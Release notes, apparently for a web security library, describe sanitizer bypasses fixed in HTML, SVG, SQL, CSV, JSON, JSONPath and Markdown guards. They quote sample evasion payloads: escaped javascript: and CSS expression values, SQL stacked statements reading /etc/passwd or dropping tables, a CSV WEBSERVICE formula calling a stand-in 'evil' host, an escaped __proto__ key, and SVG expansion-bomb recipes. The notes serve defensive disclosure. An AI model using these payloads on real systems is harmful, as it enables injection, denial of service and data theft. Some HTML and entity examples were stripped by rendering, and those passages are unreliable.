headline: Content guards inspect what the consumer sees, not what the source shows
summary: Every guard in the `b.guard*` family has regions it treats as inert: a comment, a quoted value, a code span, a string literal, an escape. Where the guard's idea of such a region disagreed with the consumer that will actually read the document, a payload could sit in the gap. This release closes that gap in `b.guardHtml`, `b.guardSvg`, `b.guardSql`, `b.guardCsv`, `b.guardJson`, `b.guardJsonpath` and `b.guardMarkdown`, corrects two values in the shared entity decoder, and removes three ways to spend unbounded time or memory on a request body that is inside the configured size cap. Upgrading requires no code change. Operators who keep dangerous SQL inside `#` comments, or who rely on `guardSvg.allowedAttrs` being ignored, will see new findings; both are described under Changed.

items.title: `b.guardSvg` reads a prefixed `href` wherever it reads `href`
items.body: In an XML document a namespace prefix is a binding, not part of the name: with `xmlns:l="http://www.w3.org/1999/xlink"` declared, `l:href` is `xlink:href`. Every rule that reads `href` in the guard matched the two literal spellings, so a bound prefix was invisible to all of them. `<a l:href="javascript:alert(1)">` and `<image l:href="javascript:alert(1)">` reported no `dangerous-url-scheme` issue at any profile, `sanitize` returned them unchanged, and a `<use l:href>` chain was not an expansion edge. The guard does not track namespace bindings; any prefix on `href` is now read wherever `href` is, which is the stricter side, and when an element carries several spellings every one is read, so a prefix bound to nothing cannot stand in front of the one a renderer honors. The dangerous-scheme check, the profile scheme allowlist, the external-reference rule at strict, the sanitizer and the expansion graph all read them.

items.title: `b.guardHtml` and `b.guardSvg` decode CSS escapes before reading a style value
items.body:
CSS lets any character of a property name, a value or an identifier be written as a backslash escape, and a renderer resolves the escape before it acts on the declaration. The `style` attribute scan matched the literal keyword, so escaping one character of the keyword hid it: `style="\6a avascript:alert(1)"`, `style="width:e\78 pression(alert(1))"` and `style="\40 import url(x)"` each reported no `css-injection` issue and the gate served them, while their unescaped spellings were critical at every profile. One hex escape, of one character, in any of `expression`, `behavior`, `-moz-binding`, `javascript`, `vbscript`, `livescript`, `@import` or `@namespace` was enough.

A style value is now unescaped before the dangerous-token scan: one to six hex digits with the single following whitespace character consumed as the delimiter, a backslash before any other character standing for that character, and a null or out-of-range code point becoming U+FFFD. Both guards read CSS through the same function, so the two agree by construction. A backslash that escapes an ordinary character, as in `content:'\201C'` or `font-family:My\ Font`, is unchanged and still passes.

The same decoding applies to the functional references the SVG expansion analysis follows, so `fill="url(\23 ref)"` and `style="fill:u\72l(#ref)"` name the same element as `fill="url(#ref)"`.

A `<style>` element is refused as a non-allowlisted tag by `b.guardSvg` and as a dangerous tag by `b.guardHtml`, so the attribute is the only CSS either guard reads.

items.title: `b.guardHtml` reads a tag the way the HTML tokenizer reads it
items.body:
Three constructs ended the guard's tag scan where a browser continues, so markup after them was never inspected and the gate served it at every profile. A quote opens a quoted attribute value only in "before attribute value" state, directly after the `=`. Anything else there opens an unquoted value, which runs to whitespace or `>`, and inside it a further `=` or a quote is data. The scanner treated any quote as an opener, so a quote inside an UNQUOTED value ran the scan to the end of the input: `

` and `

` each reported no issues at all. A `>` inside a genuinely quoted value still does not end the tag. `text/html` has no CDATA section. ``, so `]]>` carries a live `img` that a browser runs. The guard was skipping to `]]>` and stepping over it. A `/` or `=` where an attribute name should start is a parse error a browser recovers from before reading the rest of the attributes. The attribute reader stopped there, so `

` lost the handler. The reader used by the security guards now resumes past such a character. The reader used by the accessibility audit still stops, because inventing an attribute that is not in the document would report an accessible page as inaccessible; both are built on one parser.

items.title: `b.guardSql` reports syntax the engines read differently instead of guessing
items.body:
The guard takes no dialect option, and in two places the engines disagree about where an inert region begins or ends. Masking either reading hides live SQL from the other, so neither choice is safe and the disagreement is reported instead.

`#` opens a line comment in MySQL and is an operator elsewhere, and MySQL opens a `--` comment only when whitespace or end of input follows, so `SELECT 1--1` is arithmetic there. Masking those to end of line hid `SELECT 3 # 1 AS a; COPY t TO PROGRAM 'true'` and `SELECT 1--1; SELECT LOAD_FILE('/etc/passwd')` from every detector including the floor rules. Not masking them would let a quote inside what SQLite and PostgreSQL do read as a comment open a literal that hides a following statement from them. Both forms now report `ambiguous-comment` as critical. `-- ` with a space, and `/* */`, are read identically by every engine and are unaffected.

A backslash before a quote inside a string literal ends that literal one character later on MySQL than on SQLite or on PostgreSQL with standard-conforming strings, so `SELECT '\''; SELECT VERSION()` and `SELECT '\'; DROP TABLE victim; -- '` each hide a stacked statement from one of them. This reports `ambiguous-literal-escape` as critical. A backslash anywhere else in a literal does not move its end and is unaffected, so an ordinary string such as `'a\b'` is accepted.

Separately, the leading-verb rules skipped only space, tab, carriage return and line feed, so a leading form feed defeated the `DO` / `CALL` / `EXECUTE` floor, the migration verb allowlist and verb-in-fragment. Vertical tab and form feed are skipped too.

items.title: `b.guardCsv` reads a cell's value, not the bytes in front of it
items.body:
A leading empty quoted section contributes nothing to a cell's value, so `""=WEBSERVICE("http://evil/")` parses to `=WEBSERVICE("http://evil/")`, a live formula, in every RFC 4180 reader including `b.csv.parse`. The formula rules decided whether a cell was quoted from its first byte and read the second quote as the trigger character, so nothing fired at any profile, and on the sanitize path the gate returned the formula unchanged in its own output. Cell values are now decoded the way a parser decodes them, including doubled quotes: a cell whose value genuinely begins with a quote is still not a formula.

`formulaInjectionPolicy: "allowlist"` passes only functions it can identify as safe. It judged the leading function name and stopped, so a denylisted call reached by concatenation or by nesting rode through unmitigated: `=SUM(1)&WEBSERVICE("http://evil/")` and `=IF(1,WEBSERVICE("http://evil/"),2)` were returned as written. Every call in the cell is checked now.

items.title: `b.guardJson` compares the key the parser will see
items.body: JSON allows `\uXXXX` inside a key string, so `{"__prot\u006f__": …}` parses to `__proto__` while the source text contains no such string. The prototype-pollution scan and the duplicate-key rescan both read the raw slice between the quotes, so one escaped character hid the key from both: `validate()` returned `ok: true` with no issues and the gate returned `serve`, at every profile. Keys are now decoded before they are compared, which covers `\uXXXX` and the short escapes. A malformed escape leaves the key as written, which is input the parser rejects anyway.

items.title: `b.guardJsonpath` matches the construct rather than one spelling
items.body:
RFC 9535 writes a filter selector as `?` followed by a logical expression, with the parentheses of the older syntax optional. The detector searched for the two characters `?(`, so `$.store.book[?@.price<10].title` passed clean at every profile while the parenthesized spelling was critical, and `b.jsonPath.query` returns the same result for both. A `?` in selector position is a filter now, wherever the whitespace falls, and a `?` inside a quoted member name still is not.

The recursive-descent cap counted only `..*` and `..[*]`, so twenty `..name` descents scored zero against a limit of two. The descendant segment is `..` whatever selector follows it.

items.title: `b.guardMarkdown` extracts links a renderer resolves
items.body:
CommonMark gives a link title three delimiter pairs. The scanner knew only the double quote, so with a `'…'` or `(…)` title it found no closing parenthesis, dropped the opening bracket, and never handed the destination to the scheme check: `[x](javascript:1 'y')` validated clean and `sanitize()` returned it unchanged at every profile, while its double-quoted twin was critical.

An angle-bracketed destination may contain spaces, which the destination scanner stops on, so `[x](<javascript:alert(1) >)` was claimed by neither the autolink reader nor the inline reader. It is read to its own closing bracket now.

The code-fence info string reaches a class attribute in renderers that interpolate it, and the rule fired only on a fence at column 0. CommonMark allows a fence up to three columns of indent, and a fence inside a block quote. Indentation is counted in columns, so a tab advances to the next stop of four. Four columns opens an indented code block, where the backticks are literal text, and is still left alone.

A link reference definition is read at any indentation, and after block-quote markers. Its indent budget is relative to the list item or block quote holding it, which a character walk has no structure to measure, so an absolute cutoff drops definitions a renderer resolves: `- item` followed by a tab-indented `[x]: javascript:alert(1)` defines a link that resolves. The scheme check now sees every definition, at the cost of also seeing one written inside indented code.

items.title: `b.codepointClass` decodes two named references to the characters HTML assigns them
items.body: `‐` decoded to U+002D HYPHEN-MINUS instead of U+2010 HYPHEN, and ` ` to a plain space instead of U+00A0. The first manufactured a scheme out of a character that cannot form one, so `[a](view‐source:x)` was refused while `[a](view‐source:x)`, the text a browser actually produces, was accepted. Both now carry the code point the HTML named-character-reference table assigns, so an entity spelling and the character it names reach the same verdict.

items.title: Three ways to spend unbounded time or memory on an accepted request body
items.body:
`b.guardMarkdown` merged its two readings of a document by appending one to the other, leaving the combined list out of document order while the scheme reader walks it by position through a forward-only index. Every backward step rescanned. A document alternating a plain link with one whose opening bracket sits inside a code span, each destination carrying zero-width padding, took 7.1 seconds to validate at 896 KB and was ACCEPTED, so the work was done on behalf of a request that passes. The same document now validates in 163 ms and a growth test holds it linear.

`b.guardHtml`'s nesting cap reported one issue per tag past the limit with no bound on the list. A 2 MiB body, inside the strict profile's own `maxBytes`, produced 419,301 issue objects and 153 MiB of heap. `b.guardSvg`'s `<use>` cap had the same shape and reported one issue per following element, and so did every finding raised once per attribute, cell, key, tag or link: an event handler on each of 20,000 attributes, a `javascript:` URL on each of 20,000 links, a `HYPERLINK` in each of 20,000 cells, a `__proto__` key in each of 20,000 objects, a `!!python/object` tag on each of 20,000 items, each produced 20,000 issue objects for a verdict the first one decided, and `b.guardJson`'s tree walk raised its node-count cap once per node past the cap, so a 200 KB array of 100,000 zeros produced 91,809 of them. `b.guardHtml`, `b.guardSvg`, `b.guardCsv`, `b.guardJson`, `b.guardYaml` and `b.guardMarkdown` now report at most `b.gateContract.MAX_ISSUES_PER_KIND` (32) issues of any one kind, through one reporter, and the verdict is unchanged.

items.title: `b.guardHtml`'s nesting cap counts nesting
items.body:
`maxTagDepth` counted every opening tag and never discounted the ones that open nothing. A void element has no matching end tag, so a flat run accumulated depth that never unwound and 129 consecutive `
` was refused as a nesting attack at the strict profile. Only elements that can nest count now. A trailing slash does not close a container in text/html, so `
` still nests, and `
` does not unwind a real ancestor.

items.title: `b.guardSvg` bounds what `<use>` expands to rather than how it is written
items.body:
`maxUseDepth` counted `<use>` elements as they appeared in the source. That is not what a `<use>` costs: it renders the subtree it names, and that subtree may hold further `<use>` elements, so the quantity to bound is how far a reference chain reaches and how many instances it expands to. Counting source nesting measured neither. A sprite sheet of 17 sibling `<use/>` icons, which expands to 17 instances, was refused as recursion, while 25 group definitions each referencing the previous one twice, which is 1.4 KB describing roughly 33 million rendered instances, passed with no issues at the balanced and permissive profiles.

The guard now builds the reference graph and walks it, reporting `use-depth-cap` when a chain is deeper than `maxUseDepth`, when references form a cycle, when the expanded instance count outruns the number of `<use>` elements that produced it, and when the elements those instances draw reach 100,000. The last measure is what bounds a wide, shallow document: five thousand references to one five-thousand-element group is five thousand instances and twenty-five million rectangles. A document of independent icons expands to about one instance per element and is unaffected, and the walk memoizes, so a document built to be expensive to measure is not.

An edge is any reference a renderer follows, not only `<use href>`. `href` on `<pattern>`, `<linearGradient>`, `<radialGradient>`, `<textPath>`, `<mpath>` and `<feImage>` names the element they take their content from, and `xlink:href` is read when `href` is absent. A `url(#id)` is followed from the properties that take one, which are `fill`, `stroke`, `mask`, `clip-path`, `filter`, `cursor`, `color-profile`, `shape-inside`, `shape-subtract` and the `marker` family, written either as an attribute or as a declaration inside `style`. A `url(#id)` elsewhere, in a label or a data attribute, paints nothing and is not an edge. An animation the profile allows can set one of those properties, so the `from`, `to`, `by` and `values` attributes of an animation element are read the same way, and a prefixed `href` is read wherever an unprefixed one is.

Within those properties the guard does not work out which declaration wins. Deciding that takes a CSS cascade: declaration order and `!important`, custom-property scope, inheritance and shadowing, guaranteed-invalid values, and the tree a `<use>` instantiates. A partial implementation of those rules is a list of the references it does not follow, so every `url(#id)` written in a property that takes one, or in a custom property, counts. The cost is the other direction: a document that names a fragment in a declaration the renderer discards, such as `fill:red;fill:url(#p)` or a `--custom` property nothing reads, is treated as referencing it. Where that matters, remove the unused declaration or raise `maxUseDepth`.

A `<defs>`, `<symbol>`, `<clipPath>`, `<mask>`, `<marker>`, `<pattern>`, `<filter>` or gradient renders when something painted references it, and is left alone when nothing does, including its own attributes. Only what renders is walked, so a loop among definitions nothing references is not a finding.

Fragments are compared after XML character references are resolved, CSS escapes are decoded, percent escapes are decoded and tab, newline and carriage return are removed, so two spellings of one id are one node. The value is read as CSS rather than searched as text: a comment is ignored, a quoted argument runs to its own closing quote, and a declaration ends at a semicolon outside quotes and parentheses.

items.title: `b.guardSvg.allowedAttrs` governs the attributes it names
items.body: `allowedAttrs` is declared on every profile and documented as an option, and neither `validate` nor `sanitize` read it, so every attribute outside the list survived both. `validate` reports an attribute outside the list as `non-allowlisted-attr`, and `sanitize` drops it. Leaving the option unset keeps the profile's behaviour unchanged.

items.title: `b.guardFilename.sanitize` documents the floor it actually has
items.body: The block said its security floor always throws regardless of mode and profile, and listed NTFS alternate data streams among the classes. It does not: at the permissive profile `reservedCharPolicy` is `strip`, so the colons become underscores before the ADS check runs and sanitize returns the repaired name. The name it returns is safe, `validate` reports `ntfs-ads` at every profile and the gate refuses it, but the sentence an operator reads was wrong. The block now states the real floor, which is path traversal raw and percent-encoded, null byte, UNC path, overlong UTF-8 and the post-strip length cap.

items.title: `b.guardSql` refuses `#` and `--` comments that lack following whitespace
items.body: Statements using `#` as a comment introducer, or `--` with no whitespace after it, now report `ambiguous-comment` as a critical issue, because the supported engines do not agree on whether the rest of the line is code or a comment. SQL that previously passed with such a comment will be refused. Rewriting the comment as `-- ` with a space, or as `/* */`, removes the finding, and both forms are read identically by every engine.

items.title: Vendored `@blamejs/pki` moves to 0.7.25
items.body: The vendored bundle rises from 0.7.9 to 0.7.25. It adds a CRL linting profile (`pki.lint.crl`, under the `rfc5280-crl` profile name), and the issuing side gains every certificate extension the reading side understands, twenty-six in all: `certificatePolicies` with its CPS and user-notice qualifiers, an `authorityKeyIdentifier` that names the issuing certificate by name and serial, the five Microsoft template extensions, `issuerAltName` on a CRL, `subjectInfoAccess`, `subjectDirectoryAttributes` and `ocspNoCheck`, and a certificate request can carry the extensions its subject owns while one the issuing CA assigns is refused by name. Two fixes ride along. `pki.asn1.build.utf8` refuses ill-formed UTF-16 with `asn1/bad-utf8-string` rather than substituting U+FFFD, which had let a distinguished name be signed carrying a replacement character its issuer never wrote. `pki.ocsp.verify` decodes a delegated responder's `ocspNoCheck` extension rather than testing for its presence, so a responder certificate carrying a malformed marker is unauthorized instead of accepted. An OCSP single response takes and parses `archiveCutoff` and `crlReferences`, and every signing verb refuses a `Date` outside years 0000 to 9999 with its own code rather than letting it reach the DER encoder. The package continues to declare no dependencies and no install, prepare or prepublish scripts.

items.title: `b.guardCsv` allowlist judges every call in a cell
items.body: `formulaInjectionPolicy: "allowlist"` previously mitigated a cell only when its leading function name was outside the list. A cell whose leading call is allowlisted but which reaches a further call by concatenation or nesting is now mitigated as well. A cell whose calls are all allowlisted is left alone, as before.

items.title: `b.gateContract.makeIssueReporter` and `MAX_ISSUES_PER_KIND`
items.body: `makeIssueReporter(issues, maxPerKind?)` returns a function that appends an issue to `issues` until `maxPerKind` issues of that `kind` have been appended and drops further ones of that kind. `maxPerKind` defaults to `MAX_ISSUES_PER_KIND`, which is 32, and a value below one is refused with a `TypeError`. The six content guards that raise a finding per offense route every finding through it. A guard built on `b.gateContract.defineGuard` can do the same.

items.title: `b.codepointClass.decodeReferenceAt`
items.body: `decodeReferenceAt(s, at)` decodes the one character reference beginning at index `at` the way `decodeMarkupEntities` decodes it, which includes a named reference completed by a numerically written ampersand, so a caller walking a string by position reproduces the whole-string result. `decodeEntityAt` reads one reference in isolation and does not model that composition; its block previously claimed the equivalence and now points here for it.

items.title: `b.markupTokenizer.parseAttrsRecovering` and `b.htmlBalance.VOID_TAGS`
items.body: `parseAttrsRecovering(src)` reads attributes past a `/` or `=` in name position, which is what a guard needs, while `parseAttrs` still stops there, which is what a structural reader needs so it never reports an attribute the document does not contain. The recovering form is a loop over the existing parser rather than a second one. `VOID_TAGS` is the existing HTML void-element set, exported so the depth rules can ask one list which elements open nothing.

items.title: The gate contract is asserted over every content guard at every profile
items.body: The integration harness drove each guard's gate through its own fixtures at the strict profile and asserted only that hostile input was not served. That passes when the action is `sanitize` and the sanitized body still carries the payload. It now checks the body the gate hands back for critical issues, and does so at all three profiles, over the guard list rather than a fixed set, so a guard added later is covered without editing the harness.

items.title: The filename floor is compared against its own documentation
items.body: A test reads the floor sentence out of the source, asserts the prose names every class that really does always throw, asserts it does not name a class refused only by a policy an operator can opt out of, and drives each named class through `sanitize` at three profiles and both modes. A class added to the prose without being implemented, or dropped from the code without being removed from the prose, fails it.

items.title: Named entity values are pinned to the HTML table
items.body: Each entry in the shared named-reference table is asserted against the code point the HTML named-character-reference table assigns that name, which is what caught the two wrong values in this release.
